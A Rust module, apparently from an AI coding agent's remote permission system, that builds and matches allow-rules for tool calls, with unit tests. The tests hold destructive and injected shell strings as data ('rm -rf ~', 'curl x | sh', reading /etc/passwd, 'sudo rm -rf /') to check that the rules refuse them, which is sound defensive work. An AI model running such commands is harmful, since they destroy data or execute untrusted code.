//! Task allow-rules for remote permission approval (architecture section 7.2).
//! A rule is `{tool, pattern}`; `pattern` is a glob over the input summary.

use crate::model::AllowRule;

/// Longest input summary kept, in chars, counting the trailing `…`.
const SUMMARY_CHARS: usize = 60;

/// Bash commands whose second word is part of the rule, e.g. `cargo test *`.
const BASH_SUBCOMMAND_TOOLS: &[&str] = &[
    "cargo", "npm", "pnpm", "yarn", "git", "go", "make", "python", "python3", "uv", "gh",
];

/// Commands that run their arguments as another command (or, for `VAR=x`, an
/// assignment before one). A prefix rule on their first word would approve any
/// command, so they never get a rule.
const BASH_WRAPPERS: &[&str] = &[
    "bash", "sh", "zsh", "dash", "env", "sudo", "doas", "xargs", "timeout", "nice", "nohup",
    "exec", "eval", "command", "time", "watch",
];

/// Characters that let one Bash command carry another: command separators,
/// pipes, substitution, redirection and line breaks. A rule's `*` would
/// otherwise let `cargo test; rm -rf ~` ride on an approved `cargo test`.
const SHELL_CONTROL: &[char] = &[';', '&', '|', '`', '$', '<', '>', '\n', '\r'];

/// The first rule that matches this tool and input summary.
///
/// For `Bash`, an input containing any of `SHELL_CONTROL` never matches, whatever
/// the rules say. The `input_summary` must be the full, untruncated command.
pub fn find_match<'a>(
    rules: &'a [AllowRule],
    tool: &str,
    input_summary: &str,
) -> Option<&'a AllowRule> {
    if tool == "Bash" && has_shell_control(input_summary) {
        return None;
    }
    // Bash input gets a trailing space so a rule `cargo test *` matches
    // `cargo test` and `cargo test -p x`, but not `cargo testfoo`.
    let input = if tool == "Bash" {
        format!("{input_summary} ")
    } else {
        input_summary.to_string()
    };
    // An empty pattern is the "ask again" rule and never matches.
    rules.iter().find(|rule| {
        rule.tool == tool && !rule.pattern.is_empty() && glob_match(&rule.pattern, &input)
    })
}

fn has_shell_control(command: &str) -> bool {
    command.contains(SHELL_CONTROL)
}

/// The rule "Allow always" adds for this tool call. `input_summary` must be the
/// full, untruncated command for `Bash`.
///
/// Bash rules are a prefix of the command plus ` *` (a word boundary): its first word, plus its
/// second word when the first is in `BASH_SUBCOMMAND_TOOLS`. A command with any
/// `SHELL_CONTROL` character, a `BASH_WRAPPERS` or `VAR=x` first word, or a
/// subcommand tool without a plain second word (`git`, `git -C dir ..`) gets
/// pattern `""`, which never matches, so it fails closed and the user is asked
/// again. Other tools get a rule for exactly this input (one file path or URL),
/// never the whole tool.
pub fn rule_for(tool: &str, input_summary: &str) -> AllowRule {
    let pattern = if tool != "Bash" {
        // Exactly this file, URL or pattern; a literal `*` cannot be expressed.
        if input_summary.contains('*') {
            String::new()
        } else {
            input_summary.to_string()
        }
    } else if has_shell_control(input_summary) {
        String::new()
    } else {
        bash_pattern(input_summary)
    };
    AllowRule {
        tool: tool.to_string(),
        pattern,
    }
}

/// `*` matches any run of characters, including none. Everything else is literal.
fn glob_match(pattern: &str, text: &str) -> bool {
    let (p, t) = (pattern.as_bytes(), text.as_bytes());
    let (mut pi, mut ti) = (0usize, 0usize);
    // Position after the last `*` in the pattern, and the text position it started at.
    let mut star: Option<usize> = None;
    let mut star_text = 0usize;
    while ti < t.len() {
        if pi < p.len() && p[pi] == b'*' {
            star = Some(pi + 1);
            star_text = ti;
            pi += 1;
        } else if pi < p.len() && p[pi] == t[ti] {
            pi += 1;
            ti += 1;
        } else if let Some(after_star) = star {
            // Let the last `*` absorb one more byte and retry.
            star_text += 1;
            ti = star_text;
            pi = after_star;
        } else {
            return false;
        }
    }
    p[pi..].iter().all(|&b| b == b'*')
}

/// Prefix of the command: its first word, plus its second word for tools in
/// `BASH_SUBCOMMAND_TOOLS`, then `*`. The prefix keeps the command's own
/// spacing, so the rule matches the command it came from.
fn bash_pattern(command: &str) -> String {
    // Byte offsets just past the first two words.
    let mut ends: Vec<usize> = Vec::new();
    let mut word_start: Option<usize> = None;
    for (i, c) in command.char_indices() {
        if c.is_whitespace() {
            if word_start.take().is_some() {
                ends.push(i);
                if ends.len() == 2 {
                    break;
                }
            }
        } else if word_start.is_none() {
            word_start = Some(i);
        }
    }
    if ends.len() < 2 && word_start.is_some() {
        ends.push(command.len());
    }
    let Some(&first_end) = ends.first() else {
        // Empty or blank command: a rule that never matches.
        return String::new();
    };
    let first_start = command.len() - command.trim_start().len();
    let first_word = &command[first_start..first_end];
    if BASH_WRAPPERS.contains(&first_word) || first_word.contains('=') {
        return String::new();
    }
    let end = if BASH_SUBCOMMAND_TOOLS.contains(&first_word) {
        // `git` alone or `git -C dir push` would give `git *`/`git -C *`, which
        // approves every subcommand: fail closed instead.
        match ends.get(1) {
            Some(&e) if !command[first_end..e].trim_start().starts_with(['-', '+']) => e,
            _ => return String::new(),
        }
    } else {
        first_end
    };
    let prefix = &command[..end];
    if prefix.contains('*') {
        // A glob cannot express a literal `*`. An empty pattern never matches
        // Bash input, so this fails closed and the user is asked again.
        return String::new();
    }
    format!("{prefix} *")
}

/// The `input_summary` a permission request is matched and shown with: the
/// tool's main argument, from the `tool_input` object (a JSON string).
/// Collapsed to one line and cut to 60 chars. Tolerant: malformed JSON never
/// panics and yields whatever could be read, or "".
pub fn summarize_input(tool: &str, input_json: &str) -> String {
    let fields = top_level_fields(input_json);
    let named = match tool {
        "Bash" => Some("command"),
        "Edit" | "Write" | "Read" | "NotebookEdit" => Some("file_path"),
        "WebFetch" => Some("url"),
        "Grep" | "Glob" => Some("pattern"),
        _ => None,
    };
    let raw = match named {
        Some(key) => fields
            .iter()
            .find(|(k, _)| k.as_str() == key)
            .and_then(|(_, v)| v.clone()),
        None => fields.iter().find_map(|(_, v)| v.clone()),
    };
    let collapsed = raw
        .unwrap_or_default()
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ");
    cut_chars(&collapsed, SUMMARY_CHARS)
}

fn cut_chars(s: &str, max: usize) -> String {
    if s.chars().count() <= max {
        return s.to_string();
    }
    let mut out: String = s.chars().take(max - 1).collect();
    out.push('…');
    out
}

/// Top-level keys of a JSON object, with the value when it is a string. Stops at
/// the first syntax error and keeps what was read before it.
fn top_level_fields(json: &str) -> Vec<(String, Option<String>)> {
    let mut p = Json {
        b: json.as_bytes(),
        i: 0,
    };
    let mut out = Vec::new();
    if p.eat(b'{').is_none() {
        return out;
    }
    p.ws();
    if p.peek() == Some(b'}') {
        return out;
    }
    while let Some(key) = p.string() {
        if p.eat(b':').is_none() {
            break;
        }
        p.ws();
        if p.peek() == Some(b'"') {
            let Some(value) = p.string() else { break };
            out.push((key, Some(value)));
        } else {
            out.push((key, None));
            if p.skip_value().is_none() {
                break;
            }
        }
        p.ws();
        if p.peek() != Some(b',') {
            break;
        }
        p.i += 1;
    }
    out
}

/// A byte cursor over JSON text. Every method returns `None` on malformed input.
struct Json<'a> {
    b: &'a [u8],
    i: usize,
}

impl Json<'_> {
    fn ws(&mut self) {
        while matches!(self.peek(), Some(b' ' | b'\t' | b'\n' | b'\r')) {
            self.i += 1;
        }
    }

    fn peek(&self) -> Option<u8> {
        self.b.get(self.i).copied()
    }

    fn eat(&mut self, c: u8) -> Option<()> {
        self.ws();
        if self.peek()? == c {
            self.i += 1;
            Some(())
        } else {
            None
        }
    }

    /// Four hex digits at `at`, without moving the cursor.
    fn hex4_at(&self, at: usize) -> Option<u32> {
        let digits = self.b.get(at..at.checked_add(4)?)?;
        digits
            .iter()
            .try_fold(0u32, |acc, &d| Some(acc * 16 + (d as char).to_digit(16)?))
    }

    /// A JSON string, with escapes decoded. Bytes outside ASCII pass through
    /// unchanged, so the result is valid UTF-8 whenever the input was.
    fn string(&mut self) -> Option<String> {
        self.ws();
        if self.peek()? != b'"' {
            return None;
        }
        self.i += 1;
        let mut out: Vec<u8> = Vec::new();
        loop {
            let c = self.peek()?;
            self.i += 1;
            match c {
                b'"' => return Some(String::from_utf8_lossy(&out).into_owned()),
                b'\\' => {
                    let e = self.peek()?;
                    self.i += 1;
                    let plain = match e {
                        b'"' => b'"',
                        b'\\' => b'\\',
                        b'/' => b'/',
                        b'b' => 8,
                        b'f' => 12,
                        b'n' => b'\n',
                        b'r' => b'\r',
                        b't' => b'\t',
                        b'u' => {
                            let hi = self.hex4_at(self.i)?;
                            self.i += 4;
                            let code = if (0xD800..0xDC00).contains(&hi)
                                && self.b.get(self.i..self.i + 2) == Some(&b"\\u"[..])
                            {
                                match self.hex4_at(self.i + 2) {
                                    Some(lo) if (0xDC00..0xE000).contains(&lo) => {
                                        self.i += 6;
                                        0x10000 + ((hi - 0xD800) << 10) + (lo - 0xDC00)
                                    }
                                    _ => 0xFFFD,
                                }
                            } else {
                                hi
                            };
                            let ch = char::from_u32(code).unwrap_or('\u{FFFD}');
                            let mut buf = [0u8; 4];
                            out.extend_from_slice(ch.encode_utf8(&mut buf).as_bytes());
                            continue;
                        }
                        _ => return None,
                    };
                    out.push(plain);
                }
                _ => out.push(c),
            }
        }
    }

    /// Skips any JSON value.
    fn skip_value(&mut self) -> Option<()> {
        self.ws();
        match self.peek()? {
            b'"' => self.string().map(|_| ()),
            open @ (b'{' | b'[') => {
                let close = if open == b'{' { b'}' } else { b']' };
                self.i += 1;
                self.ws();
                if self.peek()? == close {
                    self.i += 1;
                    return Some(());
                }
                loop {
                    if open == b'{' {
                        self.string()?;
                        self.eat(b':')?;
                    }
                    self.skip_value()?;
                    self.ws();
                    match self.peek()? {
                        b',' => self.i += 1,
                        c if c == close => {
                            self.i += 1;
                            return Some(());
                        }
                        _ => return None,
                    }
                }
            }
            _ => {
                // Number, true, false or null.
                let start = self.i;
                while matches!(self.peek(), Some(c) if c.is_ascii_alphanumeric() || matches!(c, b'-' | b'+' | b'.'))
                {
                    self.i += 1;
                }
                (self.i > start).then_some(())
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rule(pattern: &str) -> AllowRule {
        AllowRule {
            tool: "T".into(),
            pattern: pattern.into(),
        }
    }

    fn glob(pattern: &str, text: &str) -> bool {
        find_match(&[rule(pattern)], "T", text).is_some()
    }

    #[test]
    fn bash_rules_stop_at_a_word_boundary() {
        let r = rule_for("Bash", "cargo test -p api");
        let rules = [r];
        assert!(find_match(&rules, "Bash", "cargo test").is_some());
        assert!(find_match(&rules, "Bash", "cargo test --lib").is_some());
        assert!(find_match(&rules, "Bash", "cargo testfoo").is_none());
        let ls = [rule_for("Bash", "ls -la")];
        assert!(find_match(&ls, "Bash", "ls").is_some());
        assert!(find_match(&ls, "Bash", "lsof -i").is_none());
    }

    #[test]
    fn glob_empty_pattern_never_matches() {
        assert!(!glob("", ""));
        assert!(!glob("", "a"));
        assert!(!glob("a", ""));
    }

    #[test]
    fn glob_only_star() {
        assert!(glob("*", ""));
        assert!(glob("*", "anything at all"));
        assert!(glob("**", "x"));
        assert!(glob("***", ""));
    }

    #[test]
    fn glob_star_positions() {
        assert!(glob("a*", "a"));
        assert!(glob("a*", "abc"));
        assert!(!glob("a*", "ba"));
        assert!(glob("*a", "ba"));
        assert!(!glob("*a", "ab"));
        assert!(glob("abc*", "abc"));
        assert!(!glob("abc*", "ab"));
    }

    #[test]
    fn glob_multiple_stars() {
        assert!(glob("a*b*c", "abc"));
        assert!(glob("a*b*c", "axxbyyc"));
        assert!(!glob("a*b*c", "acb"));
        assert!(glob("a*c*", "abcd"));
        assert!(!glob("a*c", "abcd"));
        assert!(glob("*aab", "aaab"));
        assert!(glob("*a*a*a", "aaa"));
        assert!(!glob("*a*a*a", "aa"));
        assert!(glob("*ab*ab", "abab"));
        assert!(!glob("*ab*ab", "aba"));
    }

    #[test]
    fn glob_literal_special_chars() {
        assert!(glob("a.b", "a.b"));
        assert!(!glob("a.b", "axb"));
        assert!(glob("[x]", "[x]"));
        assert!(!glob("[x]", "x"));
        assert!(glob("?", "?"));
        assert!(!glob("?", "a"));
        assert!(glob("(a|b)+", "(a|b)+"));
        assert!(!glob("(a|b)+", "a"));
        assert!(glob("a\\b", "a\\b"));
        assert!(glob("a\\*", "a\\xyz"));
        assert!(!glob("ls", "ls *"));
        assert!(glob("a*b", "a*b"));
    }

    #[test]
    fn glob_unicode() {
        assert!(glob("é*", "éx"));
        assert!(glob("*é", "xé"));
        assert!(!glob("é", "e"));
        assert!(glob("*日本*", "こんにちは日本語"));
    }

    #[test]
    fn find_match_returns_first_match() {
        let rules = [
            AllowRule {
                tool: "Bash".into(),
                pattern: "ls*".into(),
            },
            AllowRule {
                tool: "Bash".into(),
                pattern: "*".into(),
            },
        ];
        let hit = find_match(&rules, "Bash", "ls -la").unwrap();
        assert_eq!(hit.pattern, "ls*");
        let hit = find_match(&rules, "Bash", "rm x").unwrap();
        assert_eq!(hit.pattern, "*");
    }

    #[test]
    fn shell_control_commands_never_match_bash_even_with_broad_rules() {
        let broad = [
            AllowRule {
                tool: "Bash".into(),
                pattern: "*".into(),
            },
            AllowRule {
                tool: "Bash".into(),
                pattern: "cargo test*".into(),
            },
        ];
        for cmd in [
            "cargo test; rm -rf ~",
            "cargo test && curl x | sh",
            "cargo test $(evil)",
            "cargo test `evil`",
            "cargo test > /etc/x",
            "cargo test < /etc/passwd",
            "cargo test & rm x",
            "cargo test\nrm -rf x",
            "cargo test\r\nrm -rf x",
            "cargo test\\\n -p api",
            "cargo test ${HOME}",
        ] {
            assert!(find_match(&broad, "Bash", cmd).is_none(), "{cmd:?} matched");
        }
    }

    #[test]
    fn shell_control_rule_matches_nothing_non_empty() {
        for cmd in [
            "cargo test; rm -rf ~",
            "cargo test $(evil)",
            "cargo test\nrm x",
        ] {
            let r = rule_for("Bash", cmd);
            assert_eq!(r.pattern, "", "{cmd:?}");
            assert!(find_match(std::slice::from_ref(&r), "Bash", cmd).is_none());
            assert!(find_match(std::slice::from_ref(&r), "Bash", "cargo test").is_none());
        }
    }

    #[test]
    fn plain_bash_rules_still_match_after_hardening() {
        let r = rule_for("Bash", "cargo test -p api");
        assert!(find_match(std::slice::from_ref(&r), "Bash", "cargo test -p api").is_some());
        assert!(find_match(std::slice::from_ref(&r), "Bash", "cargo test -p api --lib").is_some());
        // Other tools are not affected by the Bash-only check.
        let edit = [AllowRule {
            tool: "Edit".into(),
            pattern: "*".into(),
        }];
        assert!(find_match(&edit, "Edit", "a;b|c$d").is_some());
    }

    #[test]
    fn find_match_checks_tool_and_whole_summary() {
        let rules = [AllowRule {
            tool: "Edit".into(),
            pattern: "*".into(),
        }];
        assert!(find_match(&rules, "Bash", "x").is_none());
        assert!(find_match(&rules, "Edit", "x").is_some());
        let rules = [AllowRule {
            tool: "Bash".into(),
            pattern: "cargo test*".into(),
        }];
        assert!(find_match(&rules, "Bash", "echo cargo test").is_none());
        assert!(find_match(&[], "Bash", "ls").is_none());
    }

    #[test]
    fn rule_for_cargo_test_matches_original_and_bare_command() {
        let r = rule_for("Bash", "cargo test -p api");
        assert_eq!(r.tool, "Bash");
        assert_eq!(r.pattern, "cargo test *");
        assert!(find_match(std::slice::from_ref(&r), "Bash", "cargo test -p api").is_some());
        assert!(find_match(std::slice::from_ref(&r), "Bash", "cargo test").is_some());
        assert!(find_match(std::slice::from_ref(&r), "Bash", "cargo build").is_none());
    }

    #[test]
    fn rule_for_git_and_other_subcommand_tools() {
        assert_eq!(
            rule_for("Bash", "git status --short").pattern,
            "git status *"
        );
        assert_eq!(
            rule_for("Bash", "python3 tests.py").pattern,
            "python3 tests.py *"
        );
        assert_eq!(rule_for("Bash", "gh pr view 12").pattern, "gh pr *");
    }

    #[test]
    fn rules_never_widen_to_every_command_of_a_tool_or_wrapper() {
        // (approved command, a command the rule must not also approve)
        for (approved, other) in [
            ("git", "git push --force origin main"),
            ("git -C /repo status", "git -C /repo push --force"),
            ("git -c color.ui=never log", "git -c alias.x=!sh x"),
            (
                "python3 -c print(1)",
                "python3 -c __import__('os').remove('x')",
            ),
            ("cargo +nightly test", "cargo +nightly publish"),
            ("RUST_LOG=debug cargo test", "RUST_LOG=debug rm -rf ~"),
            ("bash scripts/check.sh", "bash -c 'rm -rf ~'"),
            ("env FOO=1 make", "env rm -rf ~"),
            ("timeout 60 cargo test", "timeout 60 rm -rf ~"),
            ("sudo ls", "sudo rm -rf /"),
        ] {
            let r = rule_for("Bash", approved);
            assert!(
                find_match(std::slice::from_ref(&r), "Bash", other).is_none(),
                "{approved:?} gave {:?}, which allows {other:?}",
                r.pattern
            );
        }
    }

    #[test]
    fn rule_for_plain_command_uses_first_word_only() {
        let r = rule_for("Bash", "ls -la /tmp");
        assert_eq!(r.pattern, "ls *");
        assert!(find_match(std::slice::from_ref(&r), "Bash", "ls -la /tmp").is_some());
    }

    #[test]
    fn rule_for_keeps_original_spacing() {
        let cmd = "  cargo   test   -p api";
        let r = rule_for("Bash", cmd);
        assert_eq!(r.pattern, "  cargo   test *");
        assert!(find_match(std::slice::from_ref(&r), "Bash", cmd).is_some());
    }

    #[test]
    fn rule_for_empty_and_blank_bash_match_nothing() {
        let r = rule_for("Bash", "");
        assert_eq!(r.pattern, "");
        assert!(find_match(std::slice::from_ref(&r), "Bash", "").is_none());
        assert!(find_match(std::slice::from_ref(&r), "Bash", "ls").is_none());
        let r = rule_for("Bash", "   ");
        assert!(find_match(std::slice::from_ref(&r), "Bash", "ls").is_none());
    }

    #[test]
    fn rule_for_star_prefix_fails_closed() {
        let cmd = "* -la";
        let r = rule_for("Bash", cmd);
        assert_eq!(r.pattern, "");
        assert!(find_match(std::slice::from_ref(&r), "Bash", cmd).is_none());
        assert!(find_match(std::slice::from_ref(&r), "Bash", "rm -rf /").is_none());
    }

    #[test]
    fn rule_for_other_tools_is_exactly_this_input() {
        for tool in ["Edit", "Write", "Read", "WebFetch", "Grep"] {
            let r = rule_for(tool, "/x/y.rs");
            assert_eq!(r.tool, tool);
            assert_eq!(r.pattern, "/x/y.rs");
            assert!(find_match(std::slice::from_ref(&r), tool, "/x/y.rs").is_some());
            assert!(find_match(std::slice::from_ref(&r), tool, "/home/u/.bashrc").is_none());
        }
        let r = rule_for("Grep", "fn *");
        assert!(find_match(std::slice::from_ref(&r), "Grep", "anything").is_none());
        let r = rule_for("Edit", "");
        assert!(find_match(std::slice::from_ref(&r), "Edit", "").is_none());
    }

    #[test]
    fn summarize_named_fields_per_tool() {
        assert_eq!(
            summarize_input("Bash", r#"{"command":"cargo test -p api"}"#),
            "cargo test -p api"
        );
        assert_eq!(
            summarize_input("Edit", r#"{"file_path":"/a/b.rs","old_string":"x"}"#),
            "/a/b.rs"
        );
        assert_eq!(
            summarize_input("Write", r#"{"content":"hi","file_path":"/w.txt"}"#),
            "/w.txt"
        );
        assert_eq!(summarize_input("Read", r#"{"file_path":"/r"}"#), "/r");
        assert_eq!(
            summarize_input("NotebookEdit", r#"{"file_path":"/n.ipynb"}"#),
            "/n.ipynb"
        );
        assert_eq!(
            summarize_input("WebFetch", r#"{"url":"https://x.test/a"}"#),
            "https://x.test/a"
        );
        assert_eq!(
            summarize_input("Grep", r#"{"pattern":"fn\\s+\\w+"}"#),
            r"fn\s+\w+"
        );
        assert_eq!(
            summarize_input("Glob", r#"{"pattern":"**/*.rs"}"#),
            "**/*.rs"
        );
    }

    #[test]
    fn summarize_named_field_missing_or_not_string_is_empty() {
        assert_eq!(summarize_input("Bash", r#"{"description":"x"}"#), "");
        assert_eq!(summarize_input("Bash", r#"{"command":5}"#), "");
        assert_eq!(summarize_input("Edit", r#"{"file_path":null,"x":"y"}"#), "");
    }

    #[test]
    fn summarize_other_tools_use_first_string_value() {
        assert_eq!(
            summarize_input("Task", r#"{"prompt":"do it","n":1}"#),
            "do it"
        );
        assert_eq!(
            summarize_input("mcp__x__y", r#"{"n":1,"b":true,"s":"second"}"#),
            "second"
        );
        assert_eq!(summarize_input("Task", r#"{"n":1,"o":{"a":"deep"}}"#), "");
        assert_eq!(summarize_input("Task", "{}"), "");
    }

    #[test]
    fn summarize_string_escapes() {
        let json = r#"{"command":"echo \"hi\"\n\tx\u00e9\ud83d\ude00 \\ \/"}"#;
        assert_eq!(summarize_input("Bash", json), "echo \"hi\" xé😀 \\ /");
        // Form feed and carriage return are whitespace; backspace is not.
        assert_eq!(summarize_input("Bash", r#"{"command":"\b\f\r"}"#), "\u{8}");
    }

    #[test]
    fn summarize_lone_surrogate_becomes_replacement() {
        assert_eq!(
            summarize_input("Bash", r#"{"command":"a\ud83dz"}"#),
            "a\u{FFFD}z"
        );
        assert_eq!(
            summarize_input("Bash", r#"{"command":"a\ude00"}"#),
            "a\u{FFFD}"
        );
        assert_eq!(
            summarize_input("Bash", r#"{"command":"\ud83d\u0041"}"#),
            "\u{FFFD}A"
        );
    }

    #[test]
    fn summarize_collapses_whitespace() {
        assert_eq!(
            summarize_input("Bash", "{\"command\":\"  ls\\n\\n  -la\\t/tmp  \"}"),
            "ls -la /tmp"
        );
    }

    #[test]
    fn summarize_cuts_to_sixty_chars_with_ellipsis() {
        let long = "a".repeat(70);
        let got = summarize_input("Bash", &format!(r#"{{"command":"{long}"}}"#));
        assert_eq!(got.chars().count(), 60);
        assert_eq!(got, format!("{}…", "a".repeat(59)));

        let exact = "b".repeat(60);
        assert_eq!(
            summarize_input("Bash", &format!(r#"{{"command":"{exact}"}}"#)),
            exact
        );
    }

    #[test]
    fn summarize_cut_respects_char_boundaries() {
        let accents = "é".repeat(61);
        let got = summarize_input("Bash", &format!(r#"{{"command":"{accents}"}}"#));
        assert_eq!(got.chars().count(), 60);
        assert_eq!(got, format!("{}…", "é".repeat(59)));

        let emoji = "😀".repeat(100);
        let got = summarize_input("Bash", &format!(r#"{{"command":"{emoji}"}}"#));
        assert_eq!(got, format!("{}…", "😀".repeat(59)));
    }

    #[test]
    fn summarize_skips_nested_values() {
        let json = r#"{"a":{"command":"no"},"list":["]}","}"],"command":"yes"}"#;
        assert_eq!(summarize_input("Bash", json), "yes");
        let json = r#"{"meta":{"k":[1,2,{"x":"}"}],"t":true,"z":null},"file_path":"/f"}"#;
        assert_eq!(summarize_input("Read", json), "/f");
    }

    #[test]
    fn summarize_malformed_never_panics() {
        let cases = [
            "",
            "not json",
            "{",
            "}",
            "{\"command\"",
            "{\"command\":",
            "{\"command\":\"ls",
            "{\"command\":\"ls\\x\"}",
            "{\"command\":\"\\u12\"}",
            "{\"command\":\"\\u+123\"}",
            "{\"command\":tru",
            "[1,2",
            "\"just a string\"",
            "null",
            "{\"a\":[1,,2],\"command\":\"x\"}",
            "{\"a\":{\"b\":",
            "{\"command\":\"ok\",\"x\":",
            "{,}",
            "{\"command\" \"ls\"}",
            "\u{0}\u{7f}",
            "{\"é\":\"ü\"}",
        ];
        for tool in ["Bash", "Edit", "Task"] {
            for case in cases {
                let _ = summarize_input(tool, case);
            }
        }
        assert_eq!(summarize_input("Bash", "{\"command\":\"ok\",\"x\":"), "ok");
        assert_eq!(summarize_input("Bash", "{\"command\":\"ls"), "");
        assert_eq!(summarize_input("Bash", "[1,2"), "");
        assert_eq!(summarize_input("Task", "{\"é\":\"ü\"}"), "ü");
    }

    #[test]
    fn summarize_empty_object_and_unicode_keys() {
        assert_eq!(summarize_input("Bash", " { } "), "");
        // Escaped keys are decoded, so this is the command field.
        assert_eq!(summarize_input("Bash", r#"{"comm\u0061nd":"x"}"#), "x");
        assert_eq!(
            summarize_input("Task", r#"{"ключ":"значение"}"#),
            "значение"
        );
    }
}
